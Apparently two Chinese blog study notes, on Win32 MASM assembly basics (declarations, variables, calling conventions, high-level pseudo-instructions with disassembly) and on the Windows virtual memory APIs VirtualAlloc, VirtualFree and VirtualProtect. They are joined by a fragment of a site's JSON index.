对MessageBox的调用可以写为: 1invoke MessageBox,NULL,offset szText,offset szCaption,MB_OK invoke并不是80386处理器的指令，而是一个伪指令，在编译的时候由编译器把上面的指令展开称为我们需要的4个push指令和1个call指令 返回值返回值的类型对汇编程序来说也是一种dword类型，它永远存放在eax中。如果返回值的内容一个eax不能容纳，Win32API采用的方法一般都是eax中反汇一个指向数据的指针，或者在调用参数中提供一个缓冲区的地址，干脆把数据返回到缓冲区中。 函数声明在调用API函数的时候，必须预先声明，否则，编译器不会认识这个函数。 invoke伪指令也无法检查参数个数。声明函数的格式是： 1函数名 proto [距离][语言][参数1]:数据类型[参数2]:数据类型 proto伪指令的距离是NEAR、FAR、NEAR16、NEAR32，FAR16或FAR32，Win32中只有一个平坦的段，无所谓距离，所以定义的时候是忽略的，语言类型就是.model那些类型。 举个例子： 12MessageBox Proto hWnd:dword,lpText:dword,lpCaption:dword,uType:dwordMessageBox Proto :dword,:dword,:dword,:dword Include对于所有要用到的API函数，在程序的开始部分必须预先声明，但这个步骤比较麻烦，为了简约，可以采用各种通用的操作方法，就是把所有的声明写在一个文件中，然后包含。 举个例子： 12include user32.incinclude kernel32.inc include语句还可以在源文件中包含其他文件，当多个源程序用到相同的函数定义、常量定义、甚至源代码的时候，可以把相同的部分写成一个文件，然后再不同的源程序中include。 编译器对include的处理仅仅只是把这一行用指定的文件内容替换 如果遇到文件和关键字同名可能会引起编译器混淆的时候，可以用”&lt;&gt;”将文件名括起来。 Includelib在Win32汇编中使用API函数，程序必须知道调用的API函数存在于那个DLL中，否则，操作系统必须搜索系统中所有的DLL，并且无法处理不同DLL中的同名函数，这显然是不显示的，所以，必须有文件包含DLL库正确的定位信息。 Win32环境中，程序链接的时候仍然使用函数库来定位函数信息，只不过由于函数代码存放于DLL中，库文件中只留着函数的定位信息和参数数据等简单信息，这种库称为导入库，一个DLL文件对应一个导入库 举个例子： 12includelib 库文件名includelib &lt;库文件名&gt; 标号、变量和数据结构当程序需要跳转到另外一个位置的时候，需要有一个标识来指示新的位置，这就是标号。 变量是计算机内存中已命名的存储位置，变量的之再运行中是需要改变的，所以它必须定义在可写的段中，或者堆栈中。 在MASM中标号和变量的命名规划如下： 可以用字母、数字、夏欢及符号@、$和?。 第一个符号不可以为数字。 长度不可以超过240个字符。 不可以使用指令关键字。 在作用域必须是唯一的。 标号标号在程序使用跳转指令的时候，可以使用标号来标识转的目的地，编译器在编译的时候将它替换为地址，标号即可以定义在目的指令同一行的头部，也可以在目的指令前一行单独用一行定义，格式如下： 123标号名: 目的指令 ;方法1或标号名:: 目的指令 ;方法2 标号的作用域是当前的子程序，在单个子程序中标号不能同名，否则编译器不知道该使用哪个地址，但在不同的子程序中可以有相同名称的标号。 @@在DOS的年代，为标号起名字很麻烦，因为汇编使用的跳转指令很多，所以程序中会有很多个标号。 事实上，很多标号使用一到两次，并不一定需要一个有意义的名称。 12345678 mov cx,1234h cmp flag,1 jz 1oc1 mov cx,1000hloc1: ... loop loc1 对于上面这样的程序，高版本的MASM使用@@标号去代替它： 12345678 mov cx,1234h cmp flag,1 jz @F mov cx,1000h@@: ... loop @B 当使用了@@作为标号的时候，可以使用@F和@B来引用，@F标识本条指令后第一个@@标号，@B标识本条指令前的第一个@@标号，程序中可以有很多个@@标号，但是@F和@B只寻找距离自己最近的那个 全局变量全局变量的定义全局变量的作用域在整个程序，Win32汇编的全局变量定义在.data或.data?段内，剋有同时定义变量的类型和长度、 12变量名 类型 初始值1,初始值2,...变量名 类型 重复数据 dup (初始值1,初始值2...) 所有使用到变量类型的情况中，只有定义全局变量的时候才可以使用缩写： 1234567 .datawHour dw ? ;未初始化的word类型变量wMinute dw 10 ;初始化为10的变量_hWnd dd ? ;双字类型的变量word_Buffer dw 100 dup (1,2) ;以0001，0002，0001，0002在内存中重复100次szBuffer byte 1024 dup (?) ;1024字节缓冲区szText db 'Hello,World!' ;字符串共占12字节。 全局变量的初始化全局变量在定义在即可只当初值，也可以使用？预留空间，在.data?段中，只可以用？预留空间。因为.data？不能初始值。如果用问号指定全局变量如果要以0为初始值的话，在程序中不必特意赋值。 局部变量局部变量定义MASM用local伪指令提供了对局部变量的支持： 1local 变量名1[[重复数据]][:类型],变量名2[[重复数据]][:类型]... local伪指令必须紧接在子程序定义的伪指令proc后、其他指令开始前，因为局部变量的数据在子程序开始之前就要确定下来。win32默认的类型是dword，当定义数组的时候，可以使用[]括号括起来，不能使用定义全局变量的dup伪指令。 123local loc1[1024]:byte ;1024字节长的局部变量locllocal loc2 ;loc2的局部变量，默认类型为dwordlocal loc3:WNDCLASS ;WNDCLASS的数据结构 使用局部变量的例子： 12345678TestProc proc local @locl:dword,@loc2:word local @loc3:byte mov eax,@loc1 mov ax,@loc2 mov al,@loc3 TestProc endp 我们可以查看一下它的反汇编代码： 1234567800401000 &gt; $ 55 push ebp00401001 . 8BEC mov ebp,esp00401003 . 83C4 F8 add esp,-0x800401006 . 8B45 FC mov eax,dword ptr ss:[ebp-0x4] ; kernel32.BaseThreadInitThunk00401009 . 66:8B45 FA mov ax,word ptr ss:[ebp-0x6]0040100D . 8A45 F9 mov al,byte ptr ss:[ebp-0x7]00401010 . C9 leave00401011 . C3 ret 可以看到，反汇编后的指令比源程序多了前后两段指令，分别是: 1234500401000 &gt; $ 55 push ebp00401001 . 8BEC mov ebp,esp00401003 . 83C4 F8 add esp,-0x8...00401010 . C9 leave 这些就是局部变量所必须的指令，分别用于局部变量的准备和收尾，执行了call指令后，CPU把反汇的地址压入栈，再转移到子程序执行，esp在程序执行过程中随时用到，不可以使用esp做指针来存取局部变量。于是在初始化之前，先使用push ebp指令把原来的ebp保存起来，然后把esp放入ebp中，供存取变量做指针用，在后面就是在堆中分配空间，堆的生长空间是向下的。所以需要增加一个负值。 在程序结束的时候，必须把正确的esp设置回去，否则ret指令会从堆中读取到错误的地址返回。 局部变量初始化局部变量的起始值是随机的，是其他子程序执行后堆栈里留下的垃圾数据，所以使用局部变量的值一定要初始化，特别是定义为结构体后当参数传递给API函数的时候。 数据结构数据结构是由多个字段组成的数据”样板”，相当于自定义的数据类型，数据结构中每一个字段可以是字节、字、双字、字符串或其他可能的数据类型。 123456789101112WNDCLASS structstyle DWORD ?lpfnWndProc DWORD ?cbClsExtra DWORD ?cbWndExtra DWORD ?hInstance DWORD ?hIcon DWORD ?hCursor DWORD ?hbrBackground DWORD ?lpszMenuName DWORD ?lpszClassName DWORD ?WNDCLASS ends 需要使用定义的结构体的方法： 123 .data?stWndClass WNDCLASS &lt;&gt; ;使用未定义方法 .... 或者 123 .datastWndClass WNDCLASS &lt;1,1,1,1,1,1,1,1,1,1&gt; ;将结构体中每个字段都初始化为1 .... 在汇编中，数据结构的引用方法有很多种，如果需要使用某个字段的时候，最直接的办法就是： 1mov eax,stWndClass.lpfnWndProc ;把lpfnWndProc字段的值存入eax中 但是在操作系统中，内存地址会代替这个名称，比如stWndClass在内存中的地址是00403000h，这句指令就会被编译称为mov eax,[00403004h]，因为lpfnWndProc是stWndClass中第二个字段，第一个字段为dword，已经占用了4字节空间。 在实际使用中， 常常有使用指针存取数据结构的情况，如果使用esi寄存器做指针寻址，可以使用下列语句完成： 12345mov esi,offset stWndClassassume esi:ptr WNDCLASSmov eax,[esi].lpfnWndProc....assume esi:nothing 在不再使用esi寄存器做指针的时候要用assume esi:nothing取消定义 变量的使用以不同的类型访问数据在MASM中以不同的类型访问不同的数据不会对变量造成影响。 1szBuffer db 1024 dup (?) 然后从其他地方获取了数据，但数据格式是以字为组织的，要处理数据，最有效的方法就是两个字节两个字节的处理。所以在MASM要用指定类型之外的长度访问变量，必须显式的指出要访问的长度 1类型 ptr 变量名 变量名可以是byte、word、dword、fword、qword、real8个real0 12mov ax,word ptr szBuffermov eax,dword ptr szBuffer 指定类型的参数访问并不会检测长度是否溢出 123456789 .databTest1 db 12hwTest2 dw 1234hdwTest3 dd 12345678h .... .codemov al,bTest1mov ax,word ptr bTest1mov eax,dword ptr bTest1 我们查看一下反汇编代码： 12300401000 &gt; $ A0 00204000 mov al,byte ptr ds:[0x402000]00401005 . 66:A1 0020400&gt;mov ax,word ptr ds:[0x402000]0040100B . A1 00204000 mov eax,dword ptr ds:[0x402000] 如果需要把一个字节扩展称为一个字或一个双字再存放，可以使用80386的扩展指令来实现。 1234movzx ax,bTest1movzx eax,bTest1movzx eax,c1movzx eax,ax 用movzx指令进行数据长度扩展是32位汇编经常使用的，该指令总是将扩展数据位用0替代。使用另一条指令movsx可以完成带符号位的扩展，当被扩展数据的做高位为0时，效果和movzx相同；当最高位为1时，则扩展部分的数据位全部用1填充。 变量的尺寸和数量在源程序中用到变量的尺寸和数量的时候，可以使用sizeof和lengthof伪指令来实现 12sizeof 变量名、数据类型或数据结构名lengthof 变量名、数据类型或数据结构名 如下代码： 123456789stWndClass WNDCLASS &lt;&gt;SzHello db 'Hello,World!', 0dwTest dd 1,2,3,4 .code mov eax,sizeof stWndClass mov ebx,sizeof WNDCLASS mov ecx,sizeof szHello mov edx,sizeof dword mov esi,sizeof dwTest 我们查看一下反汇编代码： 1234500401000 &gt; $ B8 28000000 mov eax,0x2800401005 . BB 28000000 mov ebx,0x280040100A ? B9 0D000000 mov ecx,0xD0040100F ? BA 04000000 mov edx,0x400401014 . BE 10000000 mov esi,0x10 sizeof和lengthor的数值是编译时候产生的，由编译器直接替换到指令中去。 获取变量地址获取变量地址的操作对于全局变量和局部变量是不同的。 1mov 寄存器,offset 变量名 offset是取变量地址的伪操作符，它仅仅把变量的地址代入到指令中，这个操作是在编译时而不是运行时完成的。 对于局部变量，它是用ebp来做指针操作的，假设ebp的值是401000h，那么局部变量1的地址是ebp-4即400FCh，由于ebp的值是随着程序的执行环境不同而不同的，所以局部变量的地址值在编译的时候也是不确定的，不可能使用offset伪操作符来获取它的地址。 所以80386处理器中有一条指令来取指针的地址，就是lea指令。 1lea eax,[ebp-4] 该指令可以在运行时按照ebp的值实际计算出地址放到eax中 如果在invoke的参数中需要使用局部变量的地址，那么可以使用addr来获取 1addr 局部变量名或全局变量名 当addr后跟全局变量名的时候，编译器自动按照offset的用法来使用；当addr后面跟着局部变量名的时候，编译器会自动用lea指令先把地址取到eax中，然后用eax来代替局部变量使用 使用子程序当程序中需要重复调用一段代码的时候，可以将它实现为一个子程序，在主程序中用call指令来调用它，这样可以不用写重复代码，仅仅使用call指令就可以完成多次同样的工作。 子程序的定义子程序的定义方式如下： 1234567子程序名 proc [距离][语言类型][可视区域][USES寄存器列表][,参数:类型]...[VARARG]local 局部变量列表 .... 指令 子程序名 endp proc和endp伪指令定义了子程序开始和结束的位置，proc后面跟的参数是子程序的属性和输入参数，子程序的属性有: 距离：可以是NEAR，FAR，NEAR16，NEAR32，FAR16或FAR32，Win32中只有一个平坦的段，无所谓距离，所以对距离的定义忽略。 语言类型：表示参数的使用方式和堆栈平衡的方式，可以是stdcall，c，syscall，basic，fortran和pascal，如果虎烈，则使用程序头部.model的值 可视区域：可以是PRIVATE，PUBLIC和EXPORT USES寄存器列表：由编译器在子程序指令开始前安排push这些寄存器的指令，并在ret前自动安排pop指令，用于保存执行环境。 参数和类型：参数指参数的名称，在定义参数名的时候不能跟全局变量和子程序的局部变量崇明。对于类型，Win32中的参数类型只有32位的dword类型。 完成定义之后，可以用invoke来调用子程序，当invoke伪指令位于被调用的子程序代码之前的时候，编译器处理到invoke语句的时候还没有扫描到子程序的定义信息。所以避免出现这种错误，必须在程序的头部用proto伪操作定义程序的信息。 参数传递和堆栈平衡在调用子程序时，参数的传递是通过堆栈进行的，也就是说：调用者把要传递给子程序的参数压入堆栈，子程序在堆栈中取出相应的值再使用。 1SubRouting(Var1,Var2,Var3) 反汇编后的代码可能是： 1234push Var3push Var2push Var1add esp,0xb ;b代表12 调用约定如下： 写一个Demo： 12345678910111213141516171819202122Sub1 proc C _Var1,Var2 mov eax,_Var1 mov ebx,_Var2 retSub1 endpSub2 proc PASCAL _Var1,Var2 mov eax,_Var1 mov ebx,_Var2 retSub2 endpSub3 proc _Var1,Var2 mov eax,_Var1 mov ebx,_Var2 retSub3 endp invoke Sub1,1,2 invoke Sub2,1,2 invoke Sub3,1,2 我们查看一下反汇编代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556;这里是Sub1-C类型.text:00401000 sub_401000 proc near ; CODE XREF: .text:00401029↓p.text:00401000.text:00401000 arg_0 = dword ptr 8.text:00401000 arg_4 = dword ptr 0Ch.text:00401000.text:00401000 push ebp.text:00401001 mov ebp, esp.text:00401003 mov eax, [ebp+arg_0].text:00401006 mov ebx, [ebp+arg_4].text:00401009 leave.text:0040100A retn.text:0040100A sub_401000 endp;这里是Sub1-PASCAL类型.text:0040100B sub_40100B proc near ; CODE XREF: .text:00401035↓p.text:0040100B.text:0040100B arg_0 = dword ptr 8.text:0040100B arg_4 = dword ptr 0Ch.text:0040100B.text:0040100B push ebp.text:0040100C mov ebp, esp.text:0040100E mov eax, [ebp+arg_4].text:00401011 mov ebx, [ebp+arg_0].text:00401014 leave.text:00401015 retn 8.text:00401015 sub_40100B endp;这里是Sub1-StaCall类型.text:00401018 sub_401018 proc near ; CODE XREF: .text:0040103E↓p.text:00401018.text:00401018 arg_0 = dword ptr 8.text:00401018 arg_4 = dword ptr 0Ch.text:00401018.text:00401018 push ebp.text:00401019 mov ebp, esp.text:0040101B mov eax, [ebp+arg_0].text:0040101E mov ebx, [ebp+arg_4].text:00401021 leave.text:00401022 retn 8.text:00401022 sub_401018 endp.text:00401025 start:;C类型.text:00401025 push 2.text:00401027 push 1.text:00401029 call sub_401000.text:0040102E add esp, 8;PASCAL类型.text:00401031 push 1.text:00401033 push 2.text:00401035 call sub_40100B;StaCall类型.text:0040103A push 2.text:0040103C push 1.text:0040103E call sub_401018 C类型和StaCall类型都是先把右边的参数压入栈，而PASCAL类型是先把左边的压入栈。在平衡堆栈上，C类型是在调用者使用call指令后，自行平衡堆栈，而PASCAl和StaCall的调用者则是不需要管理堆栈，堆栈平衡的操作都是由子程序完成。 Win32默认使用StdCall，所以在调用子程序或API后，不需要自行平衡堆栈 高级语言条件测试语句在高级语言中，所有的分支和循环语句首先都要涉及条件，也就是涉及一个表达式的结果是”TRUE”还是”FALSE”的问题，表达式中往往有用来做比较和计算的操作符。 1寄存器或变量 操作符 操作数 两个以上的表达式可以用逻辑运算符链接： 1(表达式1)逻辑运算符(表达式2)逻辑运算符(表达式3) 标志寄存器的各种标志位来做条件跳转，它们本身相当于一个表达式： 12345CARRY? 表示Carry位是否置位OVERFLOW? 表示Overflow位是否置位PARITY? 表示Parity位是否置位SIGN? 表示Sign位是否置位ZERO? 表示Zero位是否置位 分支分支语句用来根据条件表达式测试的真假执行不同的代码模块 123456789.if 条件表达式1 表达式1为&quot;真&quot;时执行的指令.elseif 条件表达式2 表达式2为&quot;真&quot;时执行的指令.elseif 条件表达式3 表达式3为&quot;真&quot;时执行的指令.else 所有表达式为&quot;假&quot;时执行的指令.endif 关键字if/elseif/else/endif的前面有个小数点，如果不加小数点，就变成宏汇编中的条件汇编伪操作了，结果差距很大 书上的Demo未通过，因为没有定义dWY和dWY，不误导。 Demo： 123456789101112131415161718192021222324252627282930 .386 .model flat,stdcall option casemap:noneinclude windows.incinclude user32.incinclude kernel32.incincludelib kernel32.libincludelib user32.libinclude gdi32.incincludelib gdi32.lib .data dWX dd ? dWY dd ? .codestart: .if eax &amp;&amp; (ebx &gt;= dWX) || !(dWY != ecx) mov esi,01 .elseif edx mov esi,02 .elseif esi &amp; 1 mov esi,03 .elseif ZERO? &amp;&amp; CARRY? mov esi,04 .endif end start 得到的汇编指令如下: 1234567891011121314151617181920212223242526 ;.if eax.text:00401000 or eax, eax.text:00401002 je short loc_40100C ;(ebx&gt;=dWX).text:00401004 cmp ebx, dword_402000.text:0040100A jnb short loc_401014 ;(dWY!=ecx).text:0040100C cmp dword_402004, ecx.text:00401012 jne short loc_40101B.text:00401014 mov esi, 1.text:00401019 jmp short near ptr word_40103E ;elseif edx.text:0040101B or edx, edx.text:0040101D je short loc_401026.text:0040101F mov esi, 2.text:00401024 jmp short near ptr word_40103E ;elseif esi &amp; 1.text:00401026 test esi, 1.text:0040102C jz short loc_401035.text:0040102E mov esi, 3.text:00401033 jmp short near ptr word_40103E ;ZERO?.text:00401035 jnz short near ptr word_40103E ;CARRY?.text:00401037 jnb short near ptr word_40103E.text:00401039 mov esi, 4 循环MASM的循环伪指令可以根据条件表达式的真假来控制循环是否继续，也可以在循环体中直接退出。 123456789101112.while 条件测试表达式 指令 [.break [.if 退出条件]] [.continue].endw;或.repeat 指令 [.break [.if 退出条件]] [.continue] .until 条件测试表达式 (或 .untilcxz [条件测试表达式]) 我们写一个Demo: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 .386 .model flat,stdcall option casemap:noneinclude windows.incinclude user32.incinclude kernel32.incincludelib kernel32.libincludelib user32.libinclude gdi32.incincludelib gdi32.lib .codestart: .while eax &gt; 1 mov esi,1 .break .if ebx .continue mov esi,2 .endw .repeat mov esi,1 .break .if !ebx .continue mov esi,2 .until eax &gt; 1 .repeat mov esi,1 .break .untilcxz end start 查看一下反汇编： 123456789101112131415161718192021222324252627282930313233;.while第一个循环开始.text:00401000 start:.text:00401000 jmp short loc_401012.text:00401002.text:00401002 mov esi, 1.text:00401007 or ebx, ebx;.break .if ebx.text:00401009 jnz short loc_401017;.continue.text:0040100B jmp short loc_401012.text:0040100D mov esi, 2;while eax &gt; 1.text:00401012 cmp eax, 1.text:00401015 ja short loc_401002.text:00401017;.rapeat第二个循环开始.text:00401017 mov esi, 1;.break .if !ebx.text:0040101C or ebx, ebx.text:0040101E jz short loc_40102C;.continue.text:00401020 jmp short loc_401027.text:00401022 mov esi, 2;.until eax &gt; 1.text:00401027 cmp eax, 1.text:0040102A jbe short loc_401017;.repeat第三个循环开始.text:0040102C;.break.text:0040102C mov esi, 1;.untilcxz.text:00401031 jmp short near ptr byte_401035.text:00401033 .^\\E2 F7 loopd short while.0040102C ;注意这里是loop指令！ .break翻译成一个跳转指令跳转到循环结束的地方 .continue是一个无条件跳转指令跳到循环开始的地方 .while是先比较条件再执行循环体 .repeat是先执行循环体再比较条件 loop指令可以自动递减ecx的值来控制循环，不适用loop将会在循环体内多设置一条递减指令 代码风格匈牙利 补充： 对局部变量的地址引用要用lea指令或者addr伪操作，全局变量要用offset 在参数的前面加下划线，在局部变量前加@，在内部程序的名称前面加下划线","link":"/2020/04/02/Windows-Assembly-3/"},{"title":"Windows-Kernel-15","text":"在应用程序中使用虚拟内存 Windows提供了三种内存管理的方法： 虚拟内存，用来管理大型对象或数据结构 内存映射文件，用来管理大型数据流（通常来自文件）以及在大哥计算机上运行的多个进行之间的共享数据 内存堆栈，用来管理大量的小对象 用于管理虚拟内存的函数可以用来直接保留一个地址空间区域，将物理存储器（来自页文件）提交给该区域，并且可以设置自己的保护属性 在地址空间中保留一个区域通过调用VirtualAlloc函数，可以在进程的地址空间中保留一个区域： 12345678910WINBASEAPI_Ret_maybenull_ _Post_writable_byte_size_(dwSize)LPVOIDWINAPIVirtualAlloc( _In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect ); pAddress 告知系统想要预定的地址空间中的哪一块。由于系统会记录所有闲置地址区间，通常只需要传递NULL就可以了。通常分配方向是随机的，但是可以指定一些标志对分配方向进行一些控制（MEM_TOP_DOWN） 第一个lpAddress指明了系统要预定的地址空间中的哪一块 第二个dwSize用于设定保留区域的大小 第三个flAllocationType：它告诉系统你想保留一个区域还是提交物理寄存器 第四个flProtect用于指明应该赋予该地址空间区域的保护属性 对于大多数程序员来说，能够让系统在指定的内存地址预定区域是个不同寻常的概念，传统的概念应该是让系统帮我们寻找一块足够大的内存并分配之，然后返回这块内存的地址。但是由于现在每个进程都有自己的地址空间，因此可以要求操作系统在我们希望的内存区域预定区域。 例如想要在虚拟地址起始50MB的地方分配，传递52428800（50x1024x1024）给lpAddress 如果这个内存地址有足够大的闲置区域，则系统会把该区域预定下来。如果没有闲置的区域，或者区域不够大。则VirtualAlloc返回NULL。另外若传递的lpAddress不在可供用户模式选择的地址空间也会直接返回NULL 因为系统是按照分配粒度来分配的。所以实际返回的地址是以lpAddress为准向下取整的（64KB分配粒度）基地址。 dwSize是我们想要预定区域的大小，以字节为单位。大小必须是页面的整数（4KB, 8KB 或16KB） 如果预定62KB 最终得到的区域大小会是64KB flAllocationType 告知所分配的区域是否需要调拨物理存储器（这种区分是必要的，因为VirtualAlloc也可以用于调拨物理存储器）要预定地址空间必须传 MEM_RESERVE 如果想预定尽可能高的地址（因为要使用很长一段时间，防止引起内存碎片）传NULL给lpAddress 同时传 MEM_TOP_DOWN |MEM_RESERVE 给flAllocationType flProtect给区域指定保护属性。区域的保护属性对于调拨给该区域的物理存储器不起任何作用。无论区域指定什么保护属性，只要还没给它调拨物理内存，试图访问区域内的任何内存地址都会引发访问违规。 看一上例子，使用VirtualAlloc预定了一块区域但是还没有调拨物理内存，试图写入整型数据直接导致异常。 在预定区域并制定保护属性时，应该考虑在调拨物理内存时最常用的保护属性。例如：PAGE_READWRITE保护属性来调拨物理存储器，则使用PAGE_READWRITE来预定区域。当区域和物理存储器的保护属性一致时，系统内部处理的效率会更高。可以使用以下保护属性。PAGE_NOACCESS, PAGE_READWRITE, PAGE_READONLY,PAGE_EXECUTE,PAGE_EXECUTE_READ,或PAGE_EXECUTE_READWRITE.不能使用PAGE_WRITECOPY和PAGE_EXECUTE_WRITECOPY(否则VirtualAlloc不会预定区域而直接返回NULL）同时也不能使用PAGE_GUARD, PAGE_NOCACHE或PAGE_WRITECOMBINE(也会返回NULL）这些都只能用来调拨物理存储器。 在保留区域中提交存储区当保留一个区域后，必须将物理存储器提交给该区域人，然后才能访问该区域中包含的内存地址。系统从它的页文件中将已提交的物理存储器分配给一个区域。 若要提交物理寄存器，必须再次调用VirtualAlloc函数，不过得把第三个参数修改为MEM_COMMIT标志。 指定保护属性通常和预定区域相同。（当然也可以指定不同的保护属性） 通过参数lpAddress（起始地址）和dwSize（存储器的大小）告知系统需要调拨多少物理内存 例如一下例子：应用程序已经在5242880处预定了一个512KB的区域。从改区域的2KB地址开始调拨6KB的物理存储器。 12char * p = (char*)VirtualAlloc((PVOID)(5242880 + (2 * 1024)), 6 * 1024, MEM_COMMIT, PAGE_READWRITE); 根据页对齐的特性，最终系统会调拨8KB的物理存储器。 5242880到5251071（5242880 + 8KB - 1）之间。这些页面都具有PAGE_READWRITE保护属性。 同一区域中的不同页面可以具有不同的保护属性。 同时进行区域的保护和内存的提交有时候需要同时预定区域并调拨物理内存，代码如下： 12PVOID pvMem = VirtualAlloc(NULL, 99 * 1024, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); 系统之所以要搜索地址空间，原因是已将 p v A d d r e s s参数设定为N U L L。如果为p v A d d r e s s设定了内存地址，系统就要查看在该内存地址上是否存在足够大的未保留地址空间。如果系统找不到足够大的未保留地址空间，Vi r t u a l A l l o c将返回N U L L。 最后需要说明的是，Vi r t u a l A l l o c将返回保留区域和提交区域的虚拟地址，然后该虚拟地址被保存在p v M e m变量中。如果系统无法找到足够大的地址空间，或者不能提交该物理存储器，Vi r t u a l A l l o c将返回N U L L。 当用这种方式来保留一个区域和提交物理存储器时，将特定的地址作为 p v A d d r e s s参数传递给 Vi r t u a l A l l o c当然是可能的。否则就必须用 O R将M E M _ TO P _ D O W N 标志与f d w A l l o c a t i o n Ty p e参数连接起来，并为p v A d d r e s s参数传递N U L L，让系统在进程的地址空间的顶部选定一个适当的区域。 如果cpu不支持大页面分配，GetLargePageMinimum会返回0. 如果要分配的页面大于该函数的返回值，就可以使用Windows大页面支持。只要在分配VirtualAlloc并将MEM_LARGE_PAGE和fdwAllocationType按位或运算即可。还需要满足一下条件：1） 要分配的内存大小必须是GetLargePageMinimum函数返回的整数倍。2）fdwAllocationType 必须传递MEM_RESERVE | MEM_COMMIT 再或上MEM_LARGE_PAGE (也就是必须同时预定+调拨物理内存）3）fdwProtect必须传递PAGE_READWRIE 何时提交物理存储器作者举了一个例子：假设一个电子表格程序，支持200行，256列。 每个单元格需要维护一个CELLDATA的结构体数据大小是128字节。如果一开始就申明好数据CELLDATA CellData[200][256]; 那么这个二维数据需要6553600个字节（200x256x128） 这样程序一开始就需要分配大量内存，而用户可能只会使用其中的少数几个单元格。内存使用率很低。通常电子表格都是使用其他数据结构来实现的，比如链表。这样当某个电子表格确实存放了数据，才需要创建与之对应的CELLDATA结构。但是同时存在一个问题，如果要访问第五行，第十列的单元格内容。这种遍历方法会很慢（事实上，可以采用二维索引表来记录对应单元格的数据地址，采用链表作为数据存储结构。这样能提升访问效率）虚拟内存也可以提供一种折中方案。享受数组方法所带来的快速而便捷的访问，又能节省存储器 为了使用虚拟内存，需要执行以下步骤。 1）预定一块足够大的区域来容纳CELLDATA结构的整个数组，只预定根本不会消耗物理存储器。2）当用户在某个单元格中输入数据时，首先确定CELLDATA结构在区域中的内存地址。由于这时还没有给该地址映射物理存储器，试图访问会引发内存错误。3）给第二步中的内存地址调拨足够的物理存储器。4）设置CELLDATA结构成员 有几个问题：如果个某个单元格调拨过物理存储器，由于分配粒度和页面对齐等原因，实际上会给相邻的区域也调拨物理存储器。那么如何判断相邻的区域是否已经调拨了物理存储器呢？1）总是尝试调拨物理存储器，这样如果该区域已经被调拨，系统并不会额外再给其调拨物理存储器。2）使用VirtualQuery来判断是否已经给CELLDATA结构调拨物理存储器。（其实这种方法会增大开销，因为VirtualQuery函数执行开销不低）3）记录哪些页面已经调拨而哪些页面未调拨。这样可以使程序运行更快，同时避免了频繁调拨VirtualAlloc。4）使用结构化异常处理（structured exception handling）SEH是操作系统的一项特性，可以在系统发生某种情况通知应用程序。给应用程序设置一个结构化异常处理程序，当程序试图访问未调拨物理存储器的内存时，系统会通知我们的应用程序。接着应用程序可以调拨物理存储器，并告知系统重新执行那条引发异常的指令。 撤销调拨物理存储器及释放区域要撤销调拨给区域的物理存储器，或者释放地址空间中的一整块区域，调用VirtualFree函数 12345678WINBASEAPIBOOLWINAPIVirtualFree( _Pre_notnull_ _When_(dwFreeType == MEM_DECOMMIT, _Post_invalid_) _When_(dwFreeType == MEM_RELEASE, _Post_ptr_invalid_) LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD dwFreeType ); 例如进程不再需要访问区域中的物理存储器，只需要调用VirtualFree一次，就能够释放整个区域以及调拨给该区域的物理存储器。 pvAddress必须是区域的基地址。也就是预定区域时VirtualAlloc返回的值。dwSize 传递0. 因为系统会记录每个分配区域的大小。传递非0值会导致失败。dwFreeType 传递 MEM_RELEASE 告知系统撤销调拨给区域的所有物理存储器，并释放区域。这种方式会释放整个已经预定的区域，例如预定了一个128KB的区域，并调拨了64KB的物理存储器，必须释放整个128KB区域。 如果仅想撤销调拨给区域的物理存储器但不想释放整个区域，则这样操作。pvAddress传递要撤销调拨区域的第一个页地址dwSize 指定想要释放的物理存储器的大小dwFreeType传递MEM_DECOMMIT 另外撤销调拨也是基于页面粒度的，如果给定的地址在一个页面的中间，那么系统会撤销调拨整个页面。同样如果pvAddress+dwSize也位于一个页面的中间，那么系统会撤销调拨包含该地址的整个页面。 如果dwSize为0，pvAddress又是区域的基地址（起始地址）则VirtualFree会撤销调拨该区域的所有页面。一旦系统撤销调拨给页面的物理存储器，那么所释放的物理存储器就可以用于系统中的其他进程，试图访问已撤销调拨的内存地址将引发访问违规。 何时回收物理存储器作者又举了电子表格的例子：如果应用程序在x86机器上运行， 那么存储页面大小就是4KB，每个页面可以存放32（4096/128）个CELLDATA结构。如果用户删了CellData[0][1]的内容，只要CellData[0][0]到CellData[0][31]之间的所有单元格都不用了，就可以撤销调拨该物理存储页。如何知道这些单元格还没有用呢？1）最理想的方案是将CELLDATA结构设计成正好等于一个页面的大小。这样每个页面只有一个结构，因此不再需要某个结构的数据时直接撤销调拨给该页面的物理存储器。但是实际情况可能很少会用到那么大的数据结构。2）另一种方案是记录哪些结构正在使用。为了节省内存，可以用一个位图。如果一个包含100个结构的数据，那么只需要维护一个包含100个位的组。一开始所有位都被设置为0，表示没有任何结构。当用到任何结构时，将位设置为1.不需要某些结构时，把对应的位设置为0.接着检查位于同一个页中的相邻结构所对应的个个位。如果同一个页面所有相邻结构都不需要了，那么就可以撤销调拨该页面。3）另一种解决方案是，实现一个垃圾收集函数。（需要系统在第一次调拨物理存储器时把所有字节都清0）。必须在结构中留出一个BOOL成员（例如bInUse）。每次把结构体放到已调拨内存中，需要把bInUse设置为TRUE。接着在程序运行时，定期调用垃圾回收函数。该函数会遍历所有潜在的数据结构并检查是否已经给各个结构调拨过物理存储器。如果已经调拨过会检查bInUse，看是否为0，如果为0.表示该结构没被用到。如果bInUse为TRUE表明结构还在使用。一旦垃圾收集函数检查完一个给定页面中所有结构，并发现所有结构都没被使用，他会调用VirtualFree来撤销调拨物理存储器。 前两个方法适合大数据页面的情况。二第三个适合结构较小的方案。 改变保护属性虽然实际应用中很少需要改变保护属性，但这仍然是可行的。假设有一段代码来管理一个链表，并把链表中的节点保存在一个已预订的区域中。然后设计一个处理函数，在每个函数的开头把物理存储页的保护属性改成PAGE_READWRITE，并在函数结束前把保护属性改成PAGE_NOACCESS这样可以保护链表的数据，使他免受其他缺陷程序的影响。如果进程中的其他代码试图用一个错误指针来访问链表数据，将会引发访问违规。如果在应用程序中定位一个很难发现的缺陷，可以试试看保护属性，他可以发挥难以置信的作用。 12345678910WINBASEAPI_Success_(return != FALSE)BOOLWINAPIVirtualProtect( _In_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flNewProtect, _Out_ PDWORD lpflOldProtect ); 